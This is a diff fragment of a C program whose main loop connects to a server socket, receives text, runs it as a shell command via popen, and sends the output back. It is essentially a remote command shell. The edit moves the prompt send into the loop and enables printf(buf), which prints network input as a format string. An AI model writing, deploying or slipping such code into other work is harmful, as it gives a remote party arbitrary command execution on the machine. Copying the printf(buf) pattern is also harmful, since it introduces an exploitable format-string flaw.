@@ -31,22 +31,19 @@ int main() {
 
   // Connect to socket
   connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
-  send( ConnectSocket, prompt, sizeof(prompt), 0);
 
   // Receive data from port;
   do {
+    send( ConnectSocket, prompt, sizeof(prompt), 0);
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
-    //printf(buf);
+    printf(buf);
     output = popen(buf, "r");
 
     while (fgets(response, RESPONSE_SZ, output) != NULL) {
       //response[sizeof(response) -2 ] = 0;
       send( ConnectSocket, response, RESPONSE_SZ, 0);
-    };
+    }
 
-    send( ConnectSocket, prompt, sizeof(prompt), 0);
-
-    //send( ConnectSocket, (char *)output, sizeof(output), 0);
     pclose(output);
   } while (1 == 1);
 
